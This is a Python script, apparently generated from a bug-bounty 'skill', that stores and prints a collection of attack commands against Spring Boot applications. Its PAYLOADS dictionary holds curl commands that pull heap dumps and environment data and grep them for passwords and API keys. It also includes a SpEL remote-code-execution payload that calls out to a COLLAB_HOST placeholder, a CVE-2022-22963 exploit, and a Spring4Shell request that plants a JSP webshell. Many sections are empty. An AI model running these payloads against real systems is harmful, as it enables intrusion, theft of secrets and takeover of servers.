#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-springboot

Skill: HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities
Desc : Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.

Run:  python claude-bughunter-hunt-springboot.py --help
      python claude-bughunter-hunt-springboot.py --list
      python claude-bughunter-hunt-springboot.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-springboot'
TITLE = 'HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities'
DESCRIPTION = 'Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.'

PAYLOADS = {
    'main': ["name: hunt-springboot", "description: Hunt Spring Boot specific vulnerabilities \u2014 Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection \u2192 RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot \u2014 detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.", "sources: hackerone_public, cve_database, spring_security_advisories", "report_count: 16"],
    'hunt-springboot-spring-boot-specific-vulnerabilities': [],
    'crown-jewel-targets': ["Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.", "**Highest-value findings:**", "- **`/actuator/heapdump`** \u2014 full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory", "- **`/actuator/env`** \u2014 lists all environment variables and Spring properties including secrets", "- **`/actuator/shutdown`** \u2014 POST \u2192 shuts down the application (Critical availability impact)", "- **H2 Console (`/h2-console`)** \u2014 in-memory DB admin UI \u2192 SQL query execution \u2192 potential RCE via `CREATE ALIAS` trick", "- **SpEL injection** \u2014 Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params \u2192 RCE", "- **Spring4Shell CVE-2022-22965** \u2014 Spring Framework < 5.3.18 + Tomcat \u2192 RCE via data binding"],
    'phase-1-fingerprint-spring-boot': ["```bash"],
    'spring-boot-indicators': ["curl -sI https://$TARGET/ | grep -i \"x-application-context\\|x-content-type\"", "curl -s \"https://$TARGET/nonexistent\" | grep -i \"Whitelabel Error Page\\|Spring Boot\\|org.springframework\""],
    'actuator-root-may-list-available-endpoints': ["curl -s \"https://$TARGET/actuator\" | python3 -m json.tool 2>/dev/null", "curl -s \"https://$TARGET/actuator/\" | python3 -m json.tool 2>/dev/null"],
    'try-common-base-paths': ["for base in \"\" \"/manage\" \"/management\" \"/app\"; do", "STATUS=$(curl -s -o /dev/null -w \"%{http_code}\" \"https://$TARGET$base/actuator\")", "[ \"$STATUS\" = \"200\" ] && echo \"[+] Actuator at: $TARGET$base/actuator\""],
    'phase-2-actuator-endpoint-enumeration': ["```bash", "BASE=\"https://$TARGET/actuator\""],
    'high-impact-endpoints': ["ENDPOINTS=(\"env\" \"heapdump\" \"threaddump\" \"mappings\" \"beans\" \"metrics\"", "\"loggers\" \"info\" \"health\" \"configprops\" \"shutdown\" \"trace\"", "\"httptrace\" \"auditevents\" \"sessions\" \"scheduledtasks\" \"caches\"", "\"flyway\" \"liquibase\" \"refresh\" \"restart\")", "for EP in \"${ENDPOINTS[@]}\"; do", "BODY=$(curl -s -H \"Accept: application/json\" \"$BASE/$EP\")", "CT=$(curl -s -o /dev/null -w \"%{content_type}\" -H \"Accept: application/json\" \"$BASE/$EP\")", "if echo \"$CT\" | grep -qi \"json\" && ! echo \"$BODY\" | grep -qi \"Whitelabel Error Page\\|<html\"; then", "echo \"[+] EXPOSED: $BASE/$EP\""],
    'get-environment-variables-passwords-api-keys': ["curl -s \"$BASE/env\" | python3 -m json.tool 2>/dev/null | grep -i \"password\\|secret\\|key\\|token\\|credential\" | head -20"],
    'get-all-endpoint-mappings-full-api-surface': ["curl -s \"$BASE/mappings\" | python3 -m json.tool 2>/dev/null | grep -oP '\"pattern\":\"\\K[^\"]+' | sort"],
    'get-spring-beans-lists-all-registered-beans-reveals-internal-architecture': ["curl -s \"$BASE/beans\" | python3 -m json.tool 2>/dev/null | head -100"],
    'phase-3-heap-dump-analysis': ["```bash"],
    'download-heap-dump-can-be-large-100mb': ["curl -s \"$BASE/heapdump\" -o /tmp/heapdump.hprof", "ls -lh /tmp/heapdump.hprof"],
    'quick-grep-for-secrets-in-heap-dump-binary-file-use-strings': ["strings /tmp/heapdump.hprof | grep -iE \"(password|secret|apikey|api_key|token|bearer|private_key)\" | \\", "grep -v \"^[a-z_]\" | sort -u | head -50"],
    'more-targeted-extraction': ["strings /tmp/heapdump.hprof | grep -oP \"(?:password|passwd|pwd)\\s*[=:]\\s*\\S+\" | sort -u | head -20", "strings /tmp/heapdump.hprof | grep -oP \"AKIA[A-Z0-9]{16}\" | sort -u        # AWS keys", "strings /tmp/heapdump.hprof | grep -oP \"sk_live_[A-Za-z0-9]+\" | sort -u     # Stripe keys", "strings /tmp/heapdump.hprof | grep -oP \"Bearer [A-Za-z0-9._-]+\" | sort -u   # Bearer tokens"],
    'use-eclipse-memory-analyzer-mat-for-deep-analysis': [],
    'https-www-eclipse-org-mat': [],
    'phase-4-h2-console-rce': ["```bash"],
    'h2-console-detection': ["curl -s \"https://$TARGET/h2-console\" | grep -i \"H2 Console\\|H2 Database\"", "curl -s \"https://$TARGET/h2\" | grep -i \"H2 Console\"", "curl -s \"https://$TARGET/console\" | grep -i \"H2\""],
    'default-credentials-sa-empty-password': [],
    'jdbc-url-jdbc-h2-mem-testdb': [],
    'if-accessible-rce-via-create-alias': [],
    'sql-to-execute': [],
    'create-alias-exec-as-string-exec-string-cmd-throws-exception': [],
    'runtime-rt-runtime-getruntime': [],
    'string-commands-sh-c-cmd': [],
    'process-proc-rt-exec-commands': [],
    'return-new-string-proc-getinputstream-readallbytes': [],
    'skill': [],
    'call-exec-id': [],
    'phase-5-spel-injection': ["```bash"],
    'spring-expression-language-injection-in-user-controlled-fields': [],
    'test-7-7-or-7-7-if-the-response-reflects-49-spel-is-being-evaluated': [],
    'common-injection-points': [],
    'email-template-fields-hello-name': [],
    'custom-annotation-value-user-input': [],
    'spring-security-expressions': [],
    'spring-webflow': [],
    'basic-spel-test': ["curl -s -X POST \"https://$TARGET/api/user/name\" \\", "-H \"Content-Type: application/json\" \\", "-d '{\"name\": \"#{7*7}\"}'"],
    'if-returns-49-spel-injection-confirmed': [],
    'rce-payload-note-exec-returns-a-process-not-a-string-so-a-bare': [],
    'exec-id-produces-no-visible-output-confirm-via-an-oob-curl-callback': [],
    'the-spawned-curl-makes-the-network-request-even-though-nothing-is-reflected': ["curl -s -X POST \"https://$TARGET/api/user/name\" \\", "-H \"Content-Type: application/json\" \\", "-d '{\"name\": \"#{T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"sh\\\",\\\"-c\\\",\\\"curl COLLAB_HOST/spel-$(id|base64)\\\"})}\"}'"],
    'cve-2022-22963-spring-cloud-function-spel': ["curl -s -X POST \"https://$TARGET/functionRouter\" \\", "-H \"spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\\\"curl COLLAB_HOST/spel-rce\\\")\" \\", "-d \"test\""],
    'phase-6-spring4shell-cve-2022-22965': ["```bash"],
    'affects-spring-framework-5-3-18-and-5-2-20-and-all-older-branches': [],
    'fixed-in-5-3-18-5-2-20-requires-jdk-9-and-war-on-tomcat-deployment': [],
    'requires-java-9-tomcat-as-war-deployment': [],
    'detection-does-the-app-accept-class-parameters': ["curl -s \"https://$TARGET/api/user\" \\", "-d \"class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/\""],
    'check-collab-for-http-callback': [],
    'exploitation-write-webshell-via-class-loader': ["curl -s \"https://$TARGET/login\" \\", "--data-raw \"username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while((a%3Din.read(b))!%3D-1)%7B+out.println(new+String(b))%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\""],
    'phase-7-jolokia-jmx-exposure': ["```bash"],
    'jolokia-provides-http-access-to-jmx-mbeans': ["curl -s \"https://$TARGET/jolokia\" | python3 -m json.tool 2>/dev/null | head -20", "curl -s \"https://$TARGET/actuator/jolokia\" | python3 -m json.tool 2>/dev/null | head -20"],
    'list-all-mbeans': ["curl -s \"https://$TARGET/jolokia/list\" | python3 -m json.tool 2>/dev/null | grep -i \"type\\|operation\" | head -30"],
    'read-system-properties-via-jolokia-may-expose-credentials': ["curl -s \"https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties\" | \\", "python3 -m json.tool 2>/dev/null | grep -i \"password\\|secret\\|key\""],
    'exec-mbean-operations-potential-rce-via-mlet': ["curl -s \"https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil\""],
    'chain-table': [],
    'validation': ["\u2705 Heap dump: strings command extracts readable passwords/tokens from .hprof file", "\u2705 Actuator/env: secrets visible in JSON response", "\u2705 SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received", "\u2705 H2 console: SQL executed, `id` output returned", "**Severity:**", "- Heapdump with credentials: Critical", "- SpEL RCE: Critical", "- H2 console RCE: Critical", "- Actuator env (passwords exposed): High", "- Mappings disclosure only: Low-Medium"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()